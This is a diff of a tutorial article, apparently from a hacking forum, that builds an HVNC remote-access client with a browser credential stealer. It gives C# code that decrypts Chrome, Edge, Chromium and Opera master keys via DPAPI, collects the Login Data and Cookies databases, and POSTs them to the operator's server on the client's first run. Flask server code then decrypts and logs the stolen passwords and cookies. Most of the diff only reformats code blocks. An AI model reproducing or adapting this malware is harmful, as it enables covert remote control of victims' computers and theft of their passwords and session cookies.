@@ -16,10 +16,11 @@ Adding coordinates when emulating a mouse along x has been moved from the server
 Added keyboard emulation.
 The full code will be at the end of the article. There are enough comments in it if you would like to study all the changes that I have not described. And now I will show some code snippets (they seem to me the most interesting of all the changes) with changes that were made outside of the previous article.
 
-[CODE=csharp]public static async Task SendPostRequestAsync(string url, string data)
+[CODE]
 
-    {
-
+    C#:
+    public static async Task SendPostRequestAsync(string url, string data)
+        {
         try
 
         {
@@ -196,13 +197,15 @@ Previously, there were parts of this code snippet that were responsible for acce
 
 Here's an example:
 
-[CODE=csharp]if (responseObject.command != null && responseObject.command == "start_hvnc")
+[CODE]
 
-{
+    if (responseObject.command != null && responseObject.command == "start_hvnc")
+
+    {
 
     await HVNC.StartHVNC(responseObject.command.ToString());
 
-}
+    }
 
 [/CODE]
 
@@ -212,8 +215,9 @@ This code means that if the received command is defined as start_hvnc, then the 
 
 Here is the called function itself:
 
-[CODE=csharp]public static async Task StartHVNC(string command)
+[CODE]
 
+    public static async Task StartHVNC(string command)
     {
 
 
@@ -442,17 +446,19 @@ Certain changes have been made to this code. For example, asynchrony has again b
 
 This code is responsible for this:
 
-[CODE=csharp]string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF\Services\usbmmIdd\Parameters\Monitors";
+[CODE]
 
-string valueName = "(Default)";
+    string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF\Services\usbmmIdd\Parameters\Monitors";
 
-string valueData = "1024.768";
+    string valueName = "(Default)";
+
+    string valueData = "1024.768";
 
 
 
-try
+    try
 
-{
+    {
 
     using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
 
@@ -486,15 +492,15 @@ try
 
     Console.WriteLine("The value was successfully written to the registry.");
 
-}
+    }
 
-catch (Exception ex)
+    catch (Exception ex)
 
-{
+    {
 
     Console.WriteLine($"Error writing to the registry: {ex.Message}");
 
-}
+    }
 
 [/CODE]
 
@@ -506,27 +512,30 @@ Now I want to show how I added x coordinates so that the emulation took place on
 
 
 
-[CODE=csharp]var allScreens = Screen.AllScreens;
+[CODE]
 
-int totalXOffset = 0;
+    var allScreens = Screen.AllScreens;
+
+    int totalXOffset = 0;
 
 
 
-for (int i = 0; i < allScreens.Length - 1; i++)
+    for (int i = 0; i < allScreens.Length - 1; i++)
 
-{
+    {
 
     totalXOffset += allScreens[i].Bounds.Width;
 
-}
+    }
 
 
 
-x += totalXOffset;
+    x += totalXOffset;
 
 
 
-Cursor.Position = new Point(x, y);[/CODE]
+    Cursor.Position = new Point(x, y);
+ [/CODE]
 
 In this code, all monitors are received, then the last one is subtracted from all monitors, and then the width of all these monitors (except the last one) is added to the coordinates received from the server. Thus, the mouse will be emulated on the last monitor, which is our virtual one.
 
@@ -586,23 +595,25 @@ Now that we've covered the basics, let's start writing sample code that clearly 
 
 Obtaining and decrypting the key:
 
-[CODE=csharp]using System;
+[CODE]
 
-using System.IO;
+    using System;
 
-using Newtonsoft.Json.Linq;
+    using System.IO;
 
-using System.Text;
+    using Newtonsoft.Json.Linq;
 
-using System.Linq;
+    using System.Text;
 
-using System.Security.Cryptography;
+    using System.Linq;
+
+    using System.Security.Cryptography;
 
 
 
-class Program
+    class Program
 
-{
+    {
 
     static void Main(string[] args)
 
@@ -688,32 +699,50 @@ class Program
 
     }
 
-}
+    }
 
 [/CODE]
 
 
 
-[CODE=csharp]string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");[/CODE] Specifies the path to the file with the key
-[CODE=csharp]string localStateData = File.ReadAllText(localStatePath); [/CODE] Reads data from a file
-[CODE=csharp]dynamic json = JObject.Parse(localStateData); [/CODE] Converts file contents to json
-[CODE=csharp]string encryptedKeyBase64 = json.os_crypt.encrypted_key; [/CODE] Searches for a key by encrypted_key
-[CODE=csharp]byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64); [/CODE] Decodes a key from base64 into bytes
-[CODE=csharp]byte[] trimmedKey = encryptedKey.Skip(5).ToArray(); [/CODE] Removes first 5 bytes
-[CODE=csharp]byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);
-string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
-Console.WriteLine($"Decrypted Key (Base64): {decryptedKeyBase64}"); [/CODE] Decrypts via DPAPI using the System.Security.Cryptography library
+[CODE]
+
+    string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");[/CODE] Specifies the path to the file with the key
+[CODE]
+
+    string localStateData = File.ReadAllText(localStatePath); [/CODE] Reads data from a file
+[CODE]
+
+    dynamic json = JObject.Parse(localStateData); [/CODE] Converts file contents to json
+[CODE]
+
+    string encryptedKeyBase64 = json.os_crypt.encrypted_key; [/CODE] Searches for a key by encrypted_key
+[CODE]
+
+    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64); [/CODE] Decodes a key from base64 into bytes
+[CODE]
+
+    byte[] trimmedKey = encryptedKey.Skip(5).ToArray(); [/CODE] Removes first 5 bytes
+[CODE]
+
+    byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);
+    string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
+    Console.WriteLine($"Decrypted Key (Base64): {decryptedKeyBase64}"); 
+ [/CODE] Decrypts via DPAPI using the System.Security.Cryptography library
+ 
 Now let's look at the code for decrypting the password using the key obtained earlier:
 
-[CODE=python]import sqlite3
+[CODE=python]
 
-import base64
+    import sqlite3
 
-from Crypto.Cipher import AES
+    import base64
+
+    from Crypto.Cipher import AES
 
 
 
-def decrypt_password(buffer, master_key):
+    def decrypt_password(buffer, master_key):
 
     try:
 
@@ -733,7 +762,7 @@ def decrypt_password(buffer, master_key):
 
 
 
-def main():
+    def main():
 
 
 
@@ -765,7 +794,7 @@ def main():
 
 
 
-if __name__ == "__main__":
+    if __name__ == "__main__":
 
     master_key_base64 = ""
 
@@ -779,7 +808,9 @@ if __name__ == "__main__":
 
 
 
-[CODE=python]def decrypt_password(buffer, master_key):
+[CODE=python]
+
+    def decrypt_password(buffer, master_key):
     try:
         iv = buffer[3:15]
         payload = buffer[15:]
@@ -789,38 +820,90 @@ if __name__ == "__main__":
     except Exception as e:
         return f"Error decrypting password: {e}"
 [/CODE] Skips the first 3 characters and defines characters 4 to 15 as IV. Then from the 15th character to the end it defines it as a password. Decrypts the password via AES using the key specified below.
-[CODE=python]login_data_path [/CODE] Path to the database file with passwords
-[CODE=python]connection = sqlite3.connect(login_data_path)
-cursor = connection.cursor() [/CODE] Connect to the database
-[CODE=python]cursor.execute("SELECT password_value FROM logins") [/CODE] Execute a query against the logins table and within it against the password_value column
-[CODE=python]master_key_base64 [/CODE] Key in base 64 format
-[CODE=python]master_key = base64.b64decode(master_key_base64) [/CODE] Decoding the key into bytes
+[CODE=python]
+
+    login_data_path [/CODE] Path to the database file with passwords
+[CODE=python]
+
+    connection = sqlite3.connect(login_data_path)
+    cursor = connection.cursor() 
+ [/CODE] Connect to the database
+[CODE=python]
+
+    cursor.execute("SELECT password_value FROM logins") [/CODE] Execute a query against the logins table and within it against the password_value column
+[CODE=python]
+
+    master_key_base64 [/CODE] Key in base 64 format
+[CODE=python]
+
+    master_key = base64.b64decode(master_key_base64) 
+[/CODE] Decoding the key into bytes
 We have looked at the example, now we will implement this in practice inside our HVNC project.
 
 First, let's expand the client so that it can collect passwords and cookies and send them along with the key.
 
 First of all, let's create the BrowserGrabber method.
-Inside the method we will specify the dictionary to the main browser folders where the file with the key is located. [CODE=csharp]Dictionary<string, string> browserPaths = new Dictionary<string, string>{
+Inside the method we will specify the dictionary to the main browser folders where the file with the key is located. 
+[CODE]
+
+    Dictionary<string, string> browserPaths = new Dictionary<string, string>{
     { "Google Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data ") },
     { "Microsoft Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data") },
     { "Chromium", Path.Combine(Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData), @"Chromium\User Data") },
     { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable") } }
-;
+    ;
 [/CODE]
-We create the main JSON object in which all information will be stored. [CODE=csharp]JObject mainJson = new JObject();[/CODE]
-Also in the foreach loop we read the contents from the file with the key [CODE=csharp]string localStateData = File.ReadAllText(localStatePath);[/CODE]
-Convert the received content to json [CODE=csharp]dynamic json = JObject.Parse(localStateData);[/CODE]
-We look for the key in the content [CODE=csharp]string encryptedKeyBase64 = json.os_crypt.encrypted_key;[/CODE]
-We decode the received key into bytes [CODE=csharp]byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);[/CODE]
-Remove the first 5 bytes [CODE=csharp]byte[] trimmedKey = encryptedKey.Skip(5).ToArray();[/CODE]
-Decrypting a key via DPAPI [CODE=csharp]byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser); string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);[/CODE]
-Creating an object for the browser whose key was found [CODE=csharp]JObject browserJson = new JObject{
+We create the main JSON object in which all information will be stored. 
+[CODE]
+
+    JObject mainJson = new JObject();[/CODE]
+Also in the foreach loop we read the contents from the file with the key 
+[CODE]
+
+    string localStateData = File.ReadAllText(localStatePath);
+[/CODE]
+Convert the received content to json 
+[CODE]
+
+    dynamic json = JObject.Parse(localStateData);
+[/CODE]
+We look for the key in the content 
+[CODE]
+
+    string encryptedKeyBase64 = json.os_crypt.encrypted_key;
+[/CODE]
+We decode the received key into bytes 
+[CODE]
+
+    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
+[/CODE]
+Remove the first 5 bytes 
+[CODE]
+
+    byte[] trimmedKey = encryptedKey.Skip(5).ToArray();
+[/CODE]
+Decrypting a key via DPAPI 
+[CODE]
+
+    byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser); string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
+[/CODE]
+Creating an object for the browser whose key was found 
+[CODE]
+
+    JObject browserJson = new JObject{
     ["key"] = decryptedKeyBase64
-};
+    };
 [/CODE]
-Recursive search for a file with cookies and passwords. [CODE=csharp]var loginDataFiles = Directory.GetFiles(userDataPath, "Login Data", SearchOption.AllDirectories);var cookiesFiles = Directory.GetFiles(userDataPath, "Cookies", SearchOption.AllDirectories);[/CODE]
-The found files are converted to base64 and then added to the browser's json object[CODE=csharp]JArray loginDataArray = new JArray(); foreach (var loginDataPath in loginDataFiles)
-{
+Recursive search for a file with cookies and passwords. 
+[CODE]
+
+    var loginDataFiles = Directory.GetFiles(userDataPath, "Login Data", SearchOption.AllDirectories);var cookiesFiles = Directory.GetFiles(userDataPath, "Cookies", SearchOption.AllDirectories);
+[/CODE]
+The found files are converted to base64 and then added to the browser's json object
+[CODE]
+
+    JArray loginDataArray = new JArray(); foreach (var loginDataPath in loginDataFiles)
+    {
      try
      {
          if (File.Exists(loginDataPath))
@@ -835,11 +918,14 @@ The found files are converted to base64 and then added to the browser's json obj
          Console.WriteLine($"Could not access Login Data file: {loginDataPath}. Error: {ex.Message}");
          continue;
      }
-}
-browserJson["login_data"] = loginDataArray;
+    }
+    browserJson["login_data"] = loginDataArray;
 [/CODE]
-The same for a cookie file [CODE=csharp]JArray cookiesArray = new JArray();                   
-foreach (var cookiesPath in cookiesFiles)
+The same for a cookie file 
+[CODE]
+
+    JArray cookiesArray = new JArray();                   
+    foreach (var cookiesPath in cookiesFiles)
                     {
                         try
                         {
@@ -858,13 +944,23 @@ foreach (var cookiesPath in cookiesFiles)
                     }
                     browserJson["cookies"] = cookiesArray;
 [/CODE]
-After writing all the necessary data to the browser object, the browser object is added to the main object: [CODE=csharp]mainJson[browserName] = browserJson;[/CODE]Since all this code is in a foreach loop, this code will be repeated over and over again , until the entire list from the dictionary with paths ends.
-Sending JSON to the server at browser_log plus a unique user ID: [CODE=csharp]await SendPostRequestAsync($"{Variables.ip}/browser_log/{Variables.uniqueId}", mainJson.ToString());[/CODE]
+After writing all the necessary data to the browser object, the browser object is added to the main object: 
+[CODE]
+
+    mainJson[browserName] = browserJson;
+[/CODE]Since all this code is in a foreach loop, this code will be repeated over and over again , until the entire list from the dictionary with paths ends.
+Sending JSON to the server at browser_log plus a unique user ID: 
+[CODE]
+
+    await SendPostRequestAsync($"{Variables.ip}/browser_log/{Variables.uniqueId}", mainJson.ToString());
+[/CODE]
 For those who don't want to learn the code line by line, here is the complete code for the function.
 
-[CODE=csharp]static async Task BrowserGrabber()
+[CODE]
 
-{
+    static async Task BrowserGrabber()
+
+    {
 
     try
 
@@ -1080,7 +1176,7 @@ For those who don't want to learn the code line by line, here is the complete co
 
     }
 
-}
+    }
 
 [/CODE]
 
@@ -1088,19 +1184,21 @@ For those who don't want to learn the code line by line, here is the complete co
 
 Now that we have written and parsed the method, we need to call it somewhere. It seems to me that the best option would be during the initial launch of the client, that is, when a unique identifier is not found and the client creates it. Here's what it looks like in code:
 
-[CODE=csharp]// Load or create a unique identifier
+[CODE]
 
-if (File.Exists(filePath))
+    // Load or create a unique identifier
 
-{
+    if (File.Exists(filePath))
+
+    {
 
     Variables.uniqueId = File.ReadAllText(filePath).Trim(); // Load a unique identifier from a file
 
-}
+    }
 
-else
+    else
 
-{
+    {
 
     Variables.uniqueId = Guid.NewGuid().ToString(); // Generate a new unique identifier
 
@@ -1110,7 +1208,7 @@ else
 
     await BrowserGrabber(); // Call browser file collection and key decryption
 
-}
+    }
 
 [/CODE]
 
@@ -1118,7 +1216,9 @@ else
 
 Let's now look at the server side of the code, which will accept JSON and decrypt AES.
 
-[CODE=python]def decrypt_password(buffer, master_key):
+[CODE=python]
+
+    def decrypt_password(buffer, master_key):
 
     try:
 
@@ -1140,7 +1240,7 @@ Let's now look at the server side of the code, which will accept JSON and decryp
 
 
 
-def decrypt_cookie(buffer, master_key):
+    def decrypt_cookie(buffer, master_key):
 
     try:
 
@@ -1162,7 +1262,7 @@ def decrypt_cookie(buffer, master_key):
 
 
 
-def process_cookies(cookies_db, master_key, cookies_file_path):
+    def process_cookies(cookies_db, master_key, cookies_file_path):
 
     try:
 
@@ -1226,9 +1326,9 @@ def process_cookies(cookies_db, master_key, cookies_file_path):
 
 
 
-@app.route('/browser_log/<unique_id>', methods=['POST'])
+    @app.route('/browser_log/<unique_id>', methods=['POST'])
 
-def receive_browser_log(unique_id):
+    def receive_browser_log(unique_id):
 
     try:
 
@@ -1386,50 +1486,80 @@ def receive_browser_log(unique_id):
 
 Now let's look at this code in parts.
 
-[CODE=python]def receive_browser_log(unique_id):[/CODE] This function first receives JSON from the client
-[CODE=python]unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
-os.makedirs(unique_id_logs_dir, exist_ok=True)
+[CODE=python]
+
+    def receive_browser_log(unique_id):
+[/CODE] This function first receives JSON from the client
+[CODE=python]
+
+    unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
+    os.makedirs(unique_id_logs_dir, exist_ok=True)
 [/CODE] Create a directory in which the logs will be stored. Each client's log folder will be named after its unique ID
-[CODE=python]passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')[/CODE] Path to the file in which passwords will be written
-[CODE=python]key_base64 = browser_data.get("key")
-if key_base64 is None:
+[CODE=python]
+
+    passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')[/CODE] Path to the file in which passwords will be written
+[CODE=python]
+
+    key_base64 = browser_data.get("key")
+    if key_base64 is None:
     print(f'There is no key in the browser {browser_name}.')
     continue
 [/CODE] Getting the key in base64 format from the data received from the client
-[CODE=python]key = base64.b64decode(key_base64)
-[/CODE] Decoding a key from base64 to bytes
-[CODE=python]decoded_data = base64.b64decode(file_data)
-db_name = f'{browser_name}_{param_name}_{idx}.db'
-db_path = os.path.join(unique_id_logs_dir, db_name)
+[CODE=python]
 
-with open(db_path, 'wb ') as db_file:
+    key = base64.b64decode(key_base64)
+[/CODE] Decoding a key from base64 to bytes
+[CODE=python]
+
+    decoded_data = base64.b64decode(file_data)
+    db_name = f'{browser_name}_{param_name}_{idx}.db'
+    db_path = os.path.join(unique_id_logs_dir, db_name)
+
+    with open(db_path, 'wb ') as db_file:
     db_file.write(decoded_data)
 
 [/CODE] This code decodes files from base64, namely databases with logins and passwords. Then these decoded files are written to the log folder that we created earlier.
-[CODE=python]if (param_name == "login_data"):
+[CODE=python]
+
+    if (param_name == "login_data"):
     connection = sqlite3.connect(db_path)
     cursor = connection.cursor()
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 [/CODE] If JSON contains the login_data parameter, then in this case a connection to this database occurs
-[CODE=python]origin_url = row[0]
-username_value = row[1]
-encrypted_password = row[2]
+[CODE=python]
+
+    origin_url = row[0]
+    username_value = row[1]
+    encrypted_password = row[2]
 [/CODE] These rows are responsible for extracting data from the columns
-[CODE=python]decrypted_password = decrypt_password(encrypted_password, key)[/CODE]The decrypt_password function is called and passed the encrypted password and the key that was previously decoded from base64.
-[CODE=python]passwords_file.write(f'Browser: {browser_name}\n')
-passwords_file.write(f'Origin URL: {origin_url}\n')
-passwords_file.write(f'Username: {username_value}\n' )
-passwords_file.write(f'Password: {decrypted_password}\n')[/CODE] Write data from database columns to a previously created text file for passwords, and the decrypted password itself.
-[CODE=python]elif param_name == "cookies":
+[CODE=python]
+
+    decrypted_password = decrypt_password(encrypted_password, key)
+[/CODE]The decrypt_password function is called and passed the encrypted password and the key     that was previously decoded from base64.
+[CODE=python]
+
+    passwords_file.write(f'Browser: {browser_name}\n')
+    passwords_file.write(f'Origin URL: {origin_url}\n')
+    passwords_file.write(f'Username: {username_value}\n' )
+    passwords_file.write(f'Password: {decrypted_password}\n')
+[/CODE] Write data from database columns to a previously created text file for passwords, and the     decrypted password itself.
+[CODE=python]
+
+    elif param_name == "cookies":
     cookies_file_path = os.path.join(unique_id_logs_dir,
                                      f'cookies_{browser_name}_{idx}.txt')
     process_cookies(decoded_data, key, cookies_file_path)
     print(f"File {db_name} was successfully saved and cookies were decrypted.")
 [/CODE] In this code, it first checks whether there is a cookies parameter in the JSON; if it exists, then the path for saving the file is formed.
-[CODE=python]process_cookies(decoded_data, key, cookies_file_path)[/CODE] The process_cookie function is called, which is passed the key, decoded cookie data and the path to the file in which the cookies will be written.
+[CODE=python]
+
+    process_cookies(decoded_data, key, cookies_file_path)
+[/CODE] The process_cookie function is called, which is passed the key, decoded cookie data and the path to the file in which the cookies will be written.
 We have already discussed the decryption function earlier in an example of how it all works. So let's look at the process_cookies function for working with cookies.
 
-[CODE=python]def process_cookies(cookies_db, master_key, cookies_file_path):
+[CODE=python]
+
+    def process_cookies(cookies_db, master_key, cookies_file_path):
 
     try:
 
@@ -1493,13 +1623,18 @@ We have already discussed the decryption function earlier in an example of how i
 
 In this code, a temporary database is first created, then a connection is made to the database. The database takes data from these columns:
 
-[CODE=python]host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly[/CODE]
+[CODE=python]
+
+    host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
+[/CODE]
 
 
 
 Then the decryption function is called:
 
-[CODE=python]decrypted_value = decrypt_cookie(item[2], master_key)
+[CODE=python]
+
+    decrypted_value = decrypt_cookie(item[2], master_key)
 
 [/CODE]
 
@@ -1507,7 +1642,9 @@ Then the decryption function is called:
 
 After this, data is written from the database columns in a certain order:
 
-[CODE=python]{item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])) .upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}
+[CODE=python]
+
+    {item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])) .upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}
 
 [/CODE]
 
